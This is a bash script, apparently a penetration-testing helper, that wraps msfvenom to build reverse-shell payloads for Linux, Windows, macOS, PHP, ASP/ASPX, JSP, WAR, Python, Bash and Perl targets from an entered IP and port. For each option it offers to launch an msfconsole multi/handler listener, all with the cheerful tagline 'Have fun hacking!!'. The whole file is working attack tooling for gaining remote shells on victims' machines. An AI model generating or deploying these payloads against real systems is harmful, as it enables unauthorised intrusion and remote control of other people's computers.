#!/bin/bash
echo "
|\/|(_ |_ |_)_.  | _  _. _| /__ _ ._  _ .__._|_ _ ._
|  |__)|  | (_|\/|(_)(_|(_| \_|(/_| |(/_|(_| |_(_)| 
               /                                    "

echo -e "MSFVENOM Reverse Shell Meterpreter Payload List"
printf "1. Linux .elf (Meterpreter)\t2.Windows .exe (Meterpreter)\n3.MAC .macho OS\t\t\t4.PHP (Meterpreter)\n5.ASP (Meterpreter)\t\t6.JSP\n7.WAR\t\t\t\t8.Python\n9.Bash .sh\t\t\t10.Perl\n11.ASPX (Meterpreter)\n\n"
echo -e "Local IP addresses =>"
echo -e $(ip -o addr show scope global | cut -d " " -f2,7)

echo -e "\nEnter Local Host IP Address:"
read lhost
echo -e "Enter Local Host Port:"
read lport
echo -e "Enter Payload Number:"
read num
echo "Payload selected = "$num
echo "Enter Shell Name(without extension):"
read shname
if [ $num == 1 ] 
then
	echo -e "Generating Linux Reverse Shell Payload (Meterpreter)"
	msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f elf > $shname.elf && echo -e "\n"$shname".elf created. Have fun hacking!!\n"
	echo -e "Do you want to open Multi Handler Listener for the above generated payload? (y or n):"
read lisn
	case $lisn in 
	[yY]) echo -e "opening multi handler meterpreter"
	   msfconsole -q -x "use exploit/multi/handler;set payload linux/x86/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; run"
	   ;;
	[nN]) echo -e "bubye"	
	   exit 0
	   ;;
	*) echo -e "unknown command"
           exit 0 
	   ;;
	esac

elif [ $num == 2 ] 
then
	echo -e "Generating Windows Reverse Shell Payload (Meterpreter)"
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f exe > $shname.exe && printf "\nshell created.Have fun hacking!!\n"
echo -e "Do you want to open Multi Handler Listener for the above generated payload? (y or n)"
read lisn
	case $lisn in 
	[yY]) echo -e "opening multi handler meterpreter"
	   msfconsole -q -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; run"
	   ;;
	[nN]) echo -e "bubye"	
	   exit 0
	   ;;
	*) echo -e "unknown command"
           exit 0 
	   ;;
	esac
elif [ $num == 3 ] 
then
	echo -e "Generating MAC OS Reverse Shell Payload"
	msfvenom -p osx/x86/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f macho > $shname.macho && printf "\nshell created.Have fun hacking!!\n"
echo -e "Do you want to open Multi Handler Listener for the above generated payload? (y or n)"
read lisn
	case $lisn in 
	[yY]) echo -e "opening multi handler"
	   msfconsole -q -x "use exploit/multi/handler;set payload osx/x86/shell_reverse_tcp; set LHOST $lhost; set LPORT $lport; run"
	   ;;
	[nN]) echo -e "bubye"	
	   exit 0
	   ;;
	*) echo -e "unknown command"
           exit 0 
	   ;;
	esac
elif [ $num == 4 ] 
then
	echo -e "Generating PHP Reverse Shell Payload (Meterpreter)"
	msfvenom -p php/meterpreter_reverse_tcp LHOST=$lhost LPORT=$lport -f raw > $shname.php && printf "\nshell created.Have fun hacking!!\n"
echo -e "Do you want to open Multi Handler Listener for the above generated payload? (y or n)"
read lisn
	case $lisn in 
	[yY]) echo -e "opening multi handler meterpreter"
	   msfconsole -q -x "use exploit/multi/handler;set payload php/meterpreter_reverse_tcp; set LHOST $lhost; set LPORT $lport; run"
	   ;;
	[nN]) echo -e "bubye"	
	   exit 0
	   ;;
	*) echo -e "unknown command"
           exit 0 
	   ;;
	esac
elif [ $num == 5 ] 
then
	echo -e "Generating ASP Reverse Shell Payload (Meterpreter)"
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f asp > $shname.asp && printf "\nshell created.Have fun hacking!!n"
echo -e "Do you want to open Multi Handler Listener for the above generated payload? (y or n)"
read lisn
	case $lisn in 
	[yY]) echo -e "opening multi handler meterpreter"
	   msfconsole -q -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; run"
	   ;;
	[nN]) echo -e "bubye"	
	   exit 0
	   ;;
	*) echo -e "unknown command"
           exit 0 
	   ;;
	esac
elif [ $num == 6 ] 
then
	echo -e "Generating JSP Reverse Shell Payload"
	msfvenom -p java/jsp_shell_reverse_tcp LHOST=$lhost LPORT=$lport -f raw > $shname.jsp && printf "\nshell created.Have fun hacking!!\n"
echo -e "Do you want to open Multi Handler Listener for the above generated payload? (y or n)"
read lisn
	case $lisn in 
	[yY]) echo -e "opening multi handler"
	   msfconsole -q -x "use exploit/multi/handler;set payload java/jsp_shell_reverse_tcp; set LHOST $lhost; set LPORT $lport; run"
	   ;;
	[nN]) echo -e "bubye"	
	   exit 0
	   ;;
	*) echo -e "unknown command"
           exit 0 
	   ;;
	esac
elif [ $num == 7 ] 
then
	echo -e "Generating WAR Reverse Shell Payload"
	msfvenom -p java/jsp_shell_reverse_tcp LHOST=$lhost LPORT=$lport -f war > $shname.war && printf "\nshell created.Have fun hacking!!\n"
echo -e "Do you want to open Multi Handler Listener for the above generated payload? (y or n)"
read lisn
	case $lisn in 
	[yY]) echo -e "opening multi handler"
	   msfconsole -q -x "use exploit/multi/handler;set payload java/jsp_shell_reverse_tcp; set LHOST $lhost; set LPORT $lport; run"
	   ;;
	[nN]) echo -e "bubye"	
	   exit 0
	   ;;
	*) echo -e "unknown command"
           exit 0 
	   ;;
	esac
elif [ $num == 8 ] 
then
	echo -e "Generating Python Reverse Shell Payload"
	msfvenom -p cmd/unix/reverse_python LHOST=$lhost LPORT=$lport -f raw > $shname.py && printf "\nshell created.Have fun hacking!!\n"
echo -e "Do you want to open Multi Handler Listener for the above generated payload? (y or n)"
read lisn
	case $lisn in 
	[yY]) echo -e "opening multi handler"
	   msfconsole -q -x "use exploit/multi/handler;set payload cmd/unix/reverse_python; set LHOST $lhost; set LPORT $lport; run"
	   ;;
	[nN]) echo -e "bubye"	
	   exit 0
	   ;;
	*) echo -e "unknown command"
           exit 0 
	   ;;
	esac
elif [ $num == 9 ] 
then
	echo -e "Generating BASH Reverse Shell Payload"
	msfvenom -p cmd/unix/reverse_bash LHOST=$lhost LPORT=$lport -f raw > $shname.sh && printf "\$shell created.Have fun hacking!!\n"
echo -e "Do you want to open Multi Handler Listener for the above generated payload? (y or n)"
read lisn
	case $lisn in 
	[yY]) echo -e "opening multi handler"
	   msfconsole -q -x "use exploit/multi/handler;set payload cmd/unix/reverse_bash; set LHOST $lhost; set LPORT $lport; run"
	   ;;
	[nN]) echo -e "bubye"	
	   exit 0
	   ;;
	*) echo -e "unknown command"
           exit 0 
	   ;;
	esac
elif [ $num == 10 ] 
then
	echo -e "Generating Perl Reverse Shell Payload"
	msfvenom -p cmd/unix/reverse_perl LHOST=$lhost LPORT=$lport -f raw > $shname.pl && printf "\$shell created.Have fun hacking!!\n"
echo -e "Do you want to open Multi Handler Listener for the above generated payload? (y or n)"
read lisn
	case $lisn in 
	[yY]) echo -e "opening multi handler meterpreter"
	   msfconsole -q -x "use exploit/multi/handler;set payload cmd/unix/reverse_perl; set LHOST $lhost; set LPORT $lport; run"
	   ;;
	[nN]) echo -e "bubye"	
	   exit 0
	   ;;
	*) echo -e "unknown command"
           exit 0 
	   ;;
	esac
elif [ $num == 11 ] 
then
	echo -e "Generating ASPX Shell Payload (Meterpreter)"
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f aspx > $shname.aspx && printf "\$shell created.Have fun hacking!!\n"
echo -e "Do you want to open Multi Handler Listener for the above generated payload? (y or n)"
read lisn
	case $lisn in 
	[yY]) echo -e "opening multi handler meterpreter"
	   msfconsole -q -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; run"
	   ;;
	[nN]) echo -e "bubye"	
	   exit 0
	   ;;
	*) echo -e "unknown command"
           exit 0 
	   ;;
	esac
fi

echo "bye bye"
